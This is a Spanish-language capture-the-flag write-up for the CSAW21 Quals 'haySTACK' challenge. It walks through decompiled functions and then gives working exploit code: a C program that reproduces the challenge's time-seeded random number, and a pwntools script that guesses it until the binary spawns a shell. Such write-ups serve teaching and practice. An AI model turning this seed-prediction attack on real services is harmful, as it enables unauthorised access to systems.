# haySTACK (CSAW21  - Quals) 

## 1. Analisis

### Main
```
void main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Help! I have lost my favorite needle in one of my 4096 identical haystacks!");
  puts("Unfortunately, I can\'t remember which one. Can you help me??");
  funcion1();
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

### void funcion1(void)
```
{
  long lVar1;
  long in_FS_OFFSET;
  int iterador;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  for (iterador = 0; iterador < 0x100000; iterador = iterador + 1) {
    *(undefined4 *)(&stack0xffffffffffbfffe8 + (long)iterador * 4) = 0xb00;
  }
  funcion2((long)&stack0xffffffffffbfffe8);
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
En esta funcion vemos que crea un array de 0x100000 posiciones y las llena con 0xb00, el ultimo if es solo la verificacion del stack canary a lo que no pondremos atención.

### void funcion2(void)
```
void funcion2(long param_1)

{
  int my_number;
  ulong goal;
  long in_FS_OFFSET;
  int contador;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  goal = get_random();
  *(undefined4 *)(param_1 + (long)(int)goal * 4) = 0x1337;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  contador = 0;
  do {
    if (2 < contador) {
LAB_00101429:
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    fwrite("Which haystack do you want to check?\n",1,0x25,stdout);
    fgets((char *)&local_38,0x20,stdin);
    my_number = atoi((char *)&local_38);
    if (my_number < 0x100001) {
      if (my_number == (int)goal) {
        printf("Hey you found a needle! And its number is 0x%08x! That\'s it!\n",
               *(uint *)(param_1 + (long)my_number * 4));
        function_win();
      }
      else {
        printf("Hey, you found a needle, but it\'s number is 0x%08x. I don\'t like that one\n",
               *(uint *)(param_1 + (long)my_number * 4));
        if (contador == 0) {
          puts(
              "Shoot, I forgot to tell you that I hid a needle in every stack. But I only have one favorite needle"
              );
        }
        else {
          if (contador == 1) {
            puts("Did I mention I\'m in a hurry? I need you to find it on your next guess");
          }
        }
      }
    }
    else {
      fwrite("I don\'t have that many haystacks!\n",1,0x22,stdout);
    }
    if (contador == 2) {
      puts("I\'m out of time. Thanks for trying...");
      goto LAB_00101429;
    }
    puts("Let\'s try again!");
    contador = contador + 1;
  } while( true );
}
```

Lo importante en esta funcion es que manda a llamar a get_random la cual devuelve un numero aleatorio y es este numero el que es elegido para seleccionar la posicion en el array donde escribira el valor 0x1337 para que despues tengamos que adivinarla y para lo cual nos da 3 oportunidades, si adivinamos entra a la funcion_win donde manda a llamar una shell. 

### ulong get_random(void)
```
ulong get_random(void)

{
  int iVar1;
  time_t tVar2;
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  iVar1 = rand();
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (long)iVar1 % 0x100000 & 0xffffffff;
}

```

Este es el algoritmo que se utiliza para generar el numero aleatorio, el cual vemos que toma como semilla el tiempo y que es generada con srand(), ademas al final le realiza una operación. Esta función la necesitaremos para poder generar el mismo numero aleatorio mas adelante.

### void function_win(void)
```
void function_win(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  system("/bin/sh");
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Finalmente la funcion_win que sera ejecutada si adivinamos la posicion en el array y nos regresara una shell.

## 2. Exploit

### random.c
```
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int get_random(){
    time_t t = time((time_t *)0x0);
    srand((uint)t);
    return rand() % 0x100000 & 0xffffffff;
}

int main(){
    printf("%d",get_random());
}
```

### exploit.py
```
#!/usr/bin/python3
from pwn import *
import os

elf = context.binary = ELF("haySTACK")
libc = elf.libc
context.log_level = "DEBUG"


gs = '''
break main
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def intentar(p,payload):
    p.sendline(payload)
    recibido= p.recv()
    return recibido

print(elf.plt)
founded=0
while(True):
    io = start()
    for i in range(0,3):
        print(str(i))
        random_value = os.popen("./random.out").read()
        print("randome_value " ,random_value)
        respuesta=intentar(io,random_value)
        print('respuesta',respuesta)
        if b'That\'s it' in respuesta:
            founded=1
            io.interactive()

    if(founded):
        break 
    io.close()
```